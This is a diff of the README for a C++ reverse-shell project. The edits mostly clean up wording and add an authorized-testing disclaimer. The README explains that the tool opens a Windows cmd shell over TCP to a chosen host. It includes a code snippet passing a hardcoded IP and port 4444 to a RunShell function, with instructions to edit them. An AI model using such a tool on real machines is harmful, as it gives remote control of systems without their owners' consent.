@@ -1,6 +1,12 @@
-# C ++ Reverse Shell
+<p align="center">
+  <img src="https://github.com/dev-frog/C-Reverse-Shell/blob/master/img/C++%20Reverse%20Shell%20Logo.png?raw=true" alt="C++ Reverse Shell logo" width="420">
+</p>
 
-This is a simple C++ based reverse shell give us a windows  cmd shell over TCP .  
+# C++ Reverse Shell
+
+A simple C++ based reverse shell that gives a Windows `cmd` shell over TCP.
+
+> **For authorized testing and education only.** Use it solely on systems you own or have explicit written permission to test. See [`docs/detection-notes.md`](docs/detection-notes.md) for the defensive / detection side.
 
 
 ## installation
@@ -11,15 +17,15 @@ This is a simple C++ based reverse shell give us a windows  cmd shell over TCP .
   
 
 
-##  change The IP and Port number in the source code
+## Change the IP and port number in the source code
 
-There is **re.cpp** file you have to open and change the **ip address** and **port number**
+Open **re.cpp** and change the **IP address** and **port number**.
 
 ![alt text](https://github.com/dev-frog/C-Reverse-Shell/blob/master/img/re.PNG)
 
     70 else {
     71    char host[] = "192.168.0.101";  // change this to your ip address
-    72    int port = 4444;                //chnage this to your open port
+    72    int port = 4444;                // change this to your open port
     73    RunShell(host, port);
     74}
     
